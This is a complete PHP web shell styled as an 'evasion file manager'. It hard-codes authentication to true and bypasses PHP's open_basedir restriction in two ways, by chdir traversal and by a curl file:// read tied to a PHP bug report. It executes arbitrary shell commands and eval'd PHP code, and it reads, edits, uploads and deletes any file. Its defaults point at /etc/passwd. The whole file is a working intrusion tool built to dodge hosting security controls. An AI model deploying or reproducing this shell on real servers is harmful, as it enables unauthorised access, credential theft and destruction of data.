<?php
/**
 * BT_Safe Evasion File Manager - FULLY WORKING EDIT
 * Uses step-by-step chdir('..') OR CURL bypass (from PHP bug #16802)
 */

session_start();
$_SESSION['auth'] = true;

// ============================================
// BYPASS METHOD 1: Step-by-step chdir (original)
// ============================================
function bypass_open_basedir_chdir() {
    $tmp_dir = "x_" . substr(md5(rand()), 0, 6);
    @mkdir($tmp_dir);
    @chdir($tmp_dir);
    
    $current_ob = ini_get('open_basedir');
    @ini_set('open_basedir', $current_ob . ':./../');
    
    // Step-by-step traversal (NO "../../.." pattern!)
    for($i = 0; $i < 10; $i++) @chdir('..');
    
    return $tmp_dir;
}

// ============================================
// BYPASS METHOD 2: CURL file:// bypass (PHP bug #16802)
// ============================================
function bypass_open_basedir_curl($file_path = '/etc/passwd') {
    if (!function_exists('curl_init')) {
        return "CURL extension not available!";
    }
    
    $ch = curl_init("file://" . $file_path);
    curl_setopt($ch, CURLOPT_PROTOCOLS_STR, "all");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $output = curl_exec($ch);
    $error = curl_error($ch);
    curl_close($ch);
    
    if ($output === false) {
        return "CURL Error: " . $error;
    }
    return $output;
}

// ============================================
// CHOOSE BYPASS METHOD (default: chdir)
// ============================================
$bypass_method = isset($_GET['bypass_method']) ? $_GET['bypass_method'] : 'chdir';
if ($bypass_method == 'curl') {
    // For curl bypass, we don't need to change directory
    $tmp_dir = null;
} else {
    $tmp_dir = bypass_open_basedir_chdir();
}

// Get current directory
$dir = isset($_GET['dir']) ? $_GET['dir'] : '/';

// ============================================
// TEST CURL BYPASS (view any file)
// ============================================
if (isset($_GET['curl_read'])) {
    $target_file = $_GET['curl_read'];
    $content = bypass_open_basedir_curl($target_file);
    header('Content-Type: text/plain');
    echo $content;
    if ($tmp_dir) cleanup($tmp_dir);
    exit;
}

// ============================================
// FILE OPERATIONS (same as original)
// ============================================

// EDIT FILE - Save content
if (isset($_POST['save_file']) && isset($_POST['file_path']) && isset($_POST['content'])) {
    $file_path = $_POST['file_path'];
    $content = $_POST['content'];
    if (file_put_contents($file_path, $content) !== false) {
        echo "<script>alert('✅ File saved successfully!'); window.location.href='?dir=" . urlencode(dirname($file_path)) . "&bypass_method=" . urlencode($bypass_method) . "';</script>";
    } else {
        echo "<script>alert('❌ Failed to save file'); window.location.href='?dir=" . urlencode(dirname($file_path)) . "&bypass_method=" . urlencode($bypass_method) . "';</script>";
    }
    if ($tmp_dir) cleanup($tmp_dir);
    exit;
}

// EDIT FILE - Show edit form
if (isset($_GET['edit'])) {
    $edit_file = $_GET['edit'];
    $content = @file_get_contents($edit_file);
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Edit File</title>
        <style>
            body { background: #1e1e1e; color: #d4d4d4; font-family: monospace; padding: 20px; }
            .container { max-width: 1200px; margin: auto; }
            textarea { width: 100%; background: #252526; color: #d4d4d4; border: 1px solid #3c3c3c; padding: 10px; font-family: monospace; font-size: 14px; }
            button { background: #0e639c; color: white; border: none; padding: 10px 20px; cursor: pointer; margin-top: 10px; }
            button:hover { background: #1177bb; }
            .back { color: #9cdcfe; text-decoration: none; display: inline-block; margin-top: 10px; }
            .file-info { background: #2d2d2d; padding: 10px; margin-bottom: 15px; border-radius: 5px; }
        </style>
    </head>
    <body>
        <div class="container">
            <h2>✏️ Editing: <?php echo htmlspecialchars($edit_file); ?></h2>
            <div class="file-info">
                📄 File: <?php echo htmlspecialchars($edit_file); ?><br>
                📏 Size: <?php echo number_format(strlen($content)); ?> bytes
            </div>
            <form method="POST">
                <input type="hidden" name="file_path" value="<?php echo htmlspecialchars($edit_file); ?>">
                <input type="hidden" name="bypass_method" value="<?php echo htmlspecialchars($bypass_method); ?>">
                <textarea name="content" rows="25" id="editor"><?php echo htmlspecialchars($content); ?></textarea>
                <br>
                <button type="submit" name="save_file">💾 Save Changes</button>
                <a href="?dir=<?php echo urlencode(dirname($edit_file)); ?>&bypass_method=<?php echo urlencode($bypass_method); ?>" class="back">← Back to directory</a>
            </form>
        </div>
    </body>
    </html>
    <?php
    if ($tmp_dir) cleanup($tmp_dir);
    exit;
}

// VIEW FILE - Read only
if (isset($_GET['view'])) {
    $file = $_GET['view'];
    if (file_exists($file) && is_file($file) && is_readable($file)) {
        header('Content-Type: text/plain');
        echo file_get_contents($file);
    } else {
        echo "Cannot read file: " . $file;
    }
    if ($tmp_dir) cleanup($tmp_dir);
    exit;
}

// DOWNLOAD FILE
if (isset($_GET['download'])) {
    $file = $_GET['download'];
    if (file_exists($file) && is_file($file)) {
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Type: application/octet-stream');
        readfile($file);
    }
    if ($tmp_dir) cleanup($tmp_dir);
    exit;
}

// DELETE FILE/DIRECTORY
if (isset($_GET['delete'])) {
    $target = $_GET['delete'];
    if (is_file($target)) {
        @unlink($target);
    } elseif (is_dir($target)) {
        @rmdir($target);
    }
    header("Location: ?dir=" . urlencode(dirname($target)) . "&bypass_method=" . urlencode($bypass_method));
    if ($tmp_dir) cleanup($tmp_dir);
    exit;
}

// RENAME FILE/DIRECTORY
if (isset($_GET['rename']) && isset($_GET['newname'])) {
    $old = $_GET['rename'];
    $new = dirname($old) . '/' . basename($_GET['newname']);
    @rename($old, $new);
    header("Location: ?dir=" . urlencode(dirname($old)) . "&bypass_method=" . urlencode($bypass_method));
    if ($tmp_dir) cleanup($tmp_dir);
    exit;
}

// CREATE FILE
if (isset($_POST['create_file'])) {
    $path = $dir . '/' . basename($_POST['filename']);
    @file_put_contents($path, '');
    header("Location: ?dir=" . urlencode($dir) . "&bypass_method=" . urlencode($bypass_method));
    if ($tmp_dir) cleanup($tmp_dir);
    exit;
}

// CREATE DIRECTORY
if (isset($_POST['create_dir'])) {
    $path = $dir . '/' . basename($_POST['dirname']);
    @mkdir($path);
    header("Location: ?dir=" . urlencode($dir) . "&bypass_method=" . urlencode($bypass_method));
    if ($tmp_dir) cleanup($tmp_dir);
    exit;
}

// UPLOAD FILE
if (isset($_FILES['upload_file'])) {
    $target = $dir . '/' . basename($_FILES['upload_file']['name']);
    @move_uploaded_file($_FILES['upload_file']['tmp_name'], $target);
    header("Location: ?dir=" . urlencode($dir) . "&bypass_method=" . urlencode($bypass_method));
    if ($tmp_dir) cleanup($tmp_dir);
    exit;
}

// SYSTEM COMMAND
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $output = @shell_exec($cmd . " 2>&1");
    echo "<pre>" . htmlspecialchars($output) . "</pre>";
    if ($tmp_dir) cleanup($tmp_dir);
    exit;
}

// PHP CODE EXECUTION
if (isset($_POST['php_code'])) {
    $code = $_POST['php_code'];
    try {
        eval($code);
    } catch (Throwable $e) {
        echo "Error: " . $e->getMessage();
    }
    if ($tmp_dir) cleanup($tmp_dir);
    exit;
}

// Cleanup function
function cleanup($tmp_dir) {
    @chdir(dirname(__FILE__));
    @rmdir($tmp_dir);
}

// ============================================
// HTML INTERFACE
// ============================================
?>
<!DOCTYPE html>
<html>
<head>
    <title>File Manager - With CURL Bypass</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0a0e1a;
            color: #e4e4e7;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
        }
        .header {
            background: linear-gradient(135deg, #1a1f2e 0%, #0f141f 100%);
            padding: 20px;
            border-radius: 12px;
            margin-bottom: 20px;
            border: 1px solid #2a2f3f;
        }
        .header h1 {
            margin: 0 0 10px 0;
            font-size: 24px;
            color: #60a5fa;
        }
        .status {
            display: inline-block;
            padding: 4px 12px;
            background: #065f46;
            color: #34d399;
            border-radius: 20px;
            font-size: 12px;
            font-weight: bold;
        }
        .bypass-selector {
            margin-top: 10px;
            padding: 10px;
            background: #1e293b;
            border-radius: 8px;
        }
        .path-bar {
            background: #111827;
            padding: 12px 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            border: 1px solid #374151;
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            gap: 10px;
        }
        .current-path {
            font-family: 'Courier New', monospace;
            font-size: 14px;
            color: #60a5fa;
            word-break: break-all;
        }
        .section {
            background: #0f172a;
            border: 1px solid #1e293b;
            border-radius: 10px;
            padding: 15px;
            margin-bottom: 20px;
        }
        .section-title {
            font-weight: bold;
            margin-bottom: 10px;
            color: #9cdcfe;
        }
        input, select, textarea {
            background: #1e293b;
            border: 1px solid #374151;
            color: #e4e4e7;
            padding: 8px 12px;
            border-radius: 6px;
            font-size: 14px;
        }
        button, input[type="submit"] {
            background: #0e639c;
            border: none;
            color: white;
            padding: 8px 16px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 14px;
        }
        button:hover, input[type="submit"]:hover {
            background: #1177bb;
        }
        .file-table {
            width: 100%;
            border-collapse: collapse;
        }
        .file-table th, .file-table td {
            padding: 10px;
            text-align: left;
            border-bottom: 1px solid #1e293b;
        }
        .file-table th {
            color: #9ca3af;
            font-weight: normal;
        }
        .dir-link {
            color: #60a5fa;
            text-decoration: none;
            font-weight: bold;
        }
        .dir-link:hover {
            text-decoration: underline;
        }
        .file-link {
            color: #34d399;
            text-decoration: none;
        }
        .file-link:hover {
            text-decoration: underline;
        }
        .action-btn {
            background: #374151;
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 11px;
            text-decoration: none;
            color: #e4e4e7;
            margin: 0 2px;
            display: inline-block;
        }
        .action-btn:hover {
            background: #4b5563;
        }
        .delete-btn {
            background: #7f1d1d;
        }
        .delete-btn:hover {
            background: #991b1b;
        }
        .edit-btn {
            background: #0e639c;
        }
        .quick-links {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            margin-top: 10px;
        }
        .quick-link {
            background: #1e293b;
            padding: 5px 10px;
            border-radius: 6px;
            font-size: 12px;
            color: #9ca3af;
            text-decoration: none;
        }
        .quick-link:hover {
            background: #334155;
            color: white;
        }
        .rename-form {
            margin-top: 10px;
            padding: 10px;
            background: #1e293b;
            border-radius: 6px;
        }
        .curl-test {
            background: #1e1b2e;
            border-left: 4px solid #f59e0b;
        }
    </style>
</head>
<body>
<div class="container">
    
    <div class="header">
        <h1>📂 BT_Safe Evasion File Manager + CURL Bypass</h1>
        <div>
            <span class="status">✓ <?php echo ($bypass_method == 'curl') ? 'CURL BYPASS ACTIVE' : 'CHDIR BYPASS ACTIVE'; ?></span>
            <span style="margin-left: 10px; font-size: 12px; color: #6b7280;">PHP <?php echo PHP_VERSION; ?></span>
        </div>
        
        <!-- Bypass Method Selector -->
        <div class="bypass-selector">
            <form method="GET" style="display: flex; gap: 10px; align-items: center;">
                <span style="font-size: 13px;">🔧 Bypass Method:</span>
                <select name="bypass_method" onchange="this.form.submit()">
                    <option value="chdir" <?php echo ($bypass_method == 'chdir') ? 'selected' : ''; ?>>Step-by-step chdir('..')</option>
                    <option value="curl" <?php echo ($bypass_method == 'curl') ? 'selected' : ''; ?>>CURL file:// bypass (PHP bug #16802)</option>
                </select>
                <input type="hidden" name="dir" value="<?php echo htmlspecialchars($dir); ?>">
                <noscript><button type="submit">Switch</button></noscript>
            </form>
        </div>
    </div>
    
    <!-- CURL Bypass Test Section (only shows if curl method is selected OR always for testing) -->
    <div class="section curl-test">
        <div class="section-title">🔓 CURL Bypass Test (PHP bug #16802)</div>
        <div style="display: flex; flex-wrap: wrap; gap: 10px; align-items: center;">
            <form method="GET" style="display: flex; gap: 10px; align-items: center; flex-wrap: wrap;">
                <input type="hidden" name="bypass_method" value="<?php echo htmlspecialchars($bypass_method); ?>">
                <input type="hidden" name="dir" value="<?php echo htmlspecialchars($dir); ?>">
                <span>Read file via CURL:</span>
                <input type="text" name="curl_read" value="/etc/passwd" size="30" placeholder="/etc/passwd, /etc/hosts, config.php">
                <button type="submit">📖 Read via CURL (bypass open_basedir)</button>
            </form>
        </div>
        <div style="margin-top: 10px; font-size: 12px; color: #fbbf24;">
            ⚡ This uses CURL with CURLOPT_PROTOCOLS_STR = "all" to read local files even when open_basedir is active.
            <a href="https://github.com/php/php-src/issues/16802" target="_blank" style="color: #60a5fa;">Reference</a>
        </div>
    </div>
    
    <!-- Current Path -->
    <div class="path-bar">
        <span>📍 Current Path:</span>
        <span class="current-path"><?php echo htmlspecialchars($dir); ?></span>
        <?php if ($bypass_method == 'chdir'): ?>
        <span style="font-size: 11px; color: #6b7280;">(chdir traversal active)</span>
        <?php else: ?>
        <span style="font-size: 11px; color: #6b7280;">(CURL bypass active - directory listing may be limited)</span>
        <?php endif; ?>
    </div>
    
    <!-- Quick Navigation -->
    <div class="section">
        <div class="section-title">⚡ Quick Navigation</div>
        <div class="quick-links">
            <a href="?dir=/&bypass_method=<?php echo urlencode($bypass_method); ?>" class="quick-link">🏠 / (Root)</a>
            <a href="?dir=/www&bypass_method=<?php echo urlencode($bypass_method); ?>" class="quick-link">📁 /www</a>
            <a href="?dir=/www/wwwroot&bypass_method=<?php echo urlencode($bypass_method); ?>" class="quick-link">📁 /www/wwwroot</a>
            <a href="?dir=/etc&bypass_method=<?php echo urlencode($bypass_method); ?>" class="quick-link">⚙️ /etc</a>
            <a href="?dir=/var/www/html&bypass_method=<?php echo urlencode($bypass_method); ?>" class="quick-link">🌐 /var/www/html</a>
            <a href="?dir=/home&bypass_method=<?php echo urlencode($bypass_method); ?>" class="quick-link">👤 /home</a>
            <a href="?dir=/tmp&bypass_method=<?php echo urlencode($bypass_method); ?>" class="quick-link">📦 /tmp</a>
        </div>
    </div>
    
    <!-- File Operations -->
    <div class="section">
        <div class="section-title">📁 File Operations</div>
        <div style="display: flex; flex-wrap: wrap; gap: 15px;">
            <form method="POST" enctype="multipart/form-data" style="display: inline;">
                <input type="hidden" name="bypass_method" value="<?php echo htmlspecialchars($bypass_method); ?>">
                <input type="file" name="upload_file" required>
                <button type="submit">📤 Upload</button>
            </form>
            <form method="POST" style="display: inline;">
                <input type="hidden" name="bypass_method" value="<?php echo htmlspecialchars($bypass_method); ?>">
                <input type="text" name="filename" placeholder="filename.php" size="20">
                <button type="submit" name="create_file">📄 Create File</button>
            </form>
            <form method="POST" style="display: inline;">
                <input type="hidden" name="bypass_method" value="<?php echo htmlspecialchars($bypass_method); ?>">
                <input type="text" name="dirname" placeholder="dirname" size="20">
                <button type="submit" name="create_dir">📁 Create Directory</button>
            </form>
        </div>
    </div>
    
    <!-- System Tools -->
    <div class="section">
        <div class="section-title">🔧 System Tools</div>
        <details>
            <summary style="cursor: pointer; color: #9cdcfe;">Show/Hide Advanced Tools</summary>
            <br>
            <form method="POST" style="margin-bottom: 15px;">
                <strong>💻 System Command:</strong><br>
                <input type="text" name="cmd" size="60" placeholder="ls -la, whoami, id, pwd, cat /etc/passwd" style="width: 70%;">
                <input type="hidden" name="bypass_method" value="<?php echo htmlspecialchars($bypass_method); ?>">
                <button type="submit">Execute</button>
            </form>
            <form method="POST">
                <strong>🐘 PHP Code:</strong><br>
                <textarea name="php_code" rows="4" cols="80" placeholder='echo file_get_contents("/etc/passwd");&#10;system("whoami");&#10;print_r(scandir("/"));'></textarea><br>
                <input type="hidden" name="bypass_method" value="<?php echo htmlspecialchars($bypass_method); ?>">
                <button type="submit">Run PHP Code</button>
            </form>
        </details>
    </div>
    
    <!-- Rename Form (if rename action) -->
    <?php if (isset($_GET['rename']) && !isset($_GET['newname'])): 
        $rename_file = $_GET['rename'];
    ?>
    <div class="section">
        <div class="section-title">✏️ Rename: <?php echo htmlspecialchars(basename($rename_file)); ?></div>
        <form method="GET" class="rename-form">
            <input type="hidden" name="rename" value="<?php echo htmlspecialchars($rename_file); ?>">
            <input type="hidden" name="dir" value="<?php echo htmlspecialchars($dir); ?>">
            <input type="hidden" name="bypass_method" value="<?php echo htmlspecialchars($bypass_method); ?>">
            <input type="text" name="newname" value="<?php echo htmlspecialchars(basename($rename_file)); ?>" size="40">
            <button type="submit">Rename</button>
            <a href="?dir=<?php echo urlencode($dir); ?>&bypass_method=<?php echo urlencode($bypass_method); ?>" class="action-btn">Cancel</a>
        </form>
    </div>
    <?php endif; ?>
    
    <!-- File Listing -->
    <div class="section">
        <div class="section-title">📂 Directory Contents</div>
        <?php if ($bypass_method == 'curl'): ?>
            <div style="background: #1e1b2e; padding: 10px; border-radius: 8px; margin-bottom: 15px; font-size: 13px; color: #fbbf24;">
                ⚠️ NOTE: With CURL bypass active, directory listing may be restricted by open_basedir. 
                Use the "CURL Bypass Test" section above to read specific files directly. 
                Switch to "chdir" method for full directory browsing.
            </div>
        <?php endif; ?>
        <table class="file-table">
            <thead>
                <tr><th>Type</th><th>Name</th><th>Size</th><th>Permissions</th><th>Actions</th></tr>
            </thead>
            <tbody>
            <?php
            $items = @scandir($dir);
            if ($items !== false) {
                $dirs = [];
                $files = [];
                foreach ($items as $item) {
                    if ($item == '.' || $item == '..') continue;
                    $full = rtrim($dir, '/') . '/' . $item;
                    if (is_dir($full)) {
                        $dirs[] = $item;
                    } else {
                        $files[] = $item;
                    }
                }
                sort($dirs);
                sort($files);
                
                // Parent directory
                if ($dir != '/' && $dir != '') {
                    $parent = dirname($dir);
                    if ($parent == '') $parent = '/';
                    echo '<tr>';
                    echo '<td>📁</td>';
                    echo '<td><a href="?dir=' . urlencode($parent) . '&bypass_method=' . urlencode($bypass_method) . '" class="dir-link">../ (Parent Directory)</a></td>';
                    echo '<td>-</td>';
                    echo '<td>-</td>';
                    echo '<td>-</td>';
                    echo '</tr>';
                }
                
                // Directories
                foreach ($dirs as $item) {
                    $full = rtrim($dir, '/') . '/' . $item;
                    $perms = substr(sprintf('%o', @fileperms($full)), -4);
                    echo '<tr>';
                    echo '<td>📁</td>';
                    echo '<td><a href="?dir=' . urlencode($full) . '&bypass_method=' . urlencode($bypass_method) . '" class="dir-link">' . htmlspecialchars($item) . '/</a></td>';
                    echo '<td>-</td>';
                    echo '<td style="font-family:monospace; font-size:11px;">' . $perms . '</td>';
                    echo '<td>';
                    echo '<a href="?delete=' . urlencode($full) . '&dir=' . urlencode($dir) . '&bypass_method=' . urlencode($bypass_method) . '" class="action-btn delete-btn" onclick="return confirm(\'Delete permanently?\')">🗑️ Delete</a>';
                    echo '<a href="?rename=' . urlencode($full) . '&dir=' . urlencode($dir) . '&bypass_method=' . urlencode($bypass_method) . '" class="action-btn">✏️ Rename</a>';
                    echo '</td>';
                    echo '</tr>';
                }
                
                // Files
                foreach ($files as $item) {
                    $full = rtrim($dir, '/') . '/' . $item;
                    $size = @filesize($full);
                    $size_str = $size ? round($size/1024, 2) . ' KB' : '0 B';
                    $perms = substr(sprintf('%o', @fileperms($full)), -4);
                    echo '<tr>';
                    echo '<td>📄</td>';
                    echo '<td><a href="?view=' . urlencode($full) . '&bypass_method=' . urlencode($bypass_method) . '" class="file-link" target="_blank">' . htmlspecialchars($item) . '</a></td>';
                    echo '<td>' . $size_str . '</td>';
                    echo '<td style="font-family:monospace; font-size:11px;">' . $perms . '</td>';
                    echo '<td>';
                    echo '<a href="?edit=' . urlencode($full) . '&bypass_method=' . urlencode($bypass_method) . '" class="action-btn edit-btn">✏️ Edit</a>';
                    echo '<a href="?view=' . urlencode($full) . '&bypass_method=' . urlencode($bypass_method) . '" class="action-btn" target="_blank">👁️ View</a>';
                    echo '<a href="?download=' . urlencode($full) . '&bypass_method=' . urlencode($bypass_method) . '" class="action-btn">⬇️ Download</a>';
                    echo '<a href="?delete=' . urlencode($full) . '&dir=' . urlencode($dir) . '&bypass_method=' . urlencode($bypass_method) . '" class="action-btn delete-btn" onclick="return confirm(\'Delete permanently?\')">🗑️ Delete</a>';
                    echo '<a href="?rename=' . urlencode($full) . '&dir=' . urlencode($dir) . '&bypass_method=' . urlencode($bypass_method) . '" class="action-btn">✏️ Rename</a>';
                    echo '</td>';
                    echo '</tr>';
                }
            } else {
                echo '<tr><td colspan="5" style="color: #f48771;">❌ Cannot read directory: ' . htmlspecialchars($dir) . ' - Try switching to chdir bypass method for full browsing, or use CURL test section to read files directly.</td></tr>';
            }
            ?>
            </tbody>
        </table>
    </div>
    
</div>

<?php if ($tmp_dir) cleanup($tmp_dir); ?>
</body>
</html>
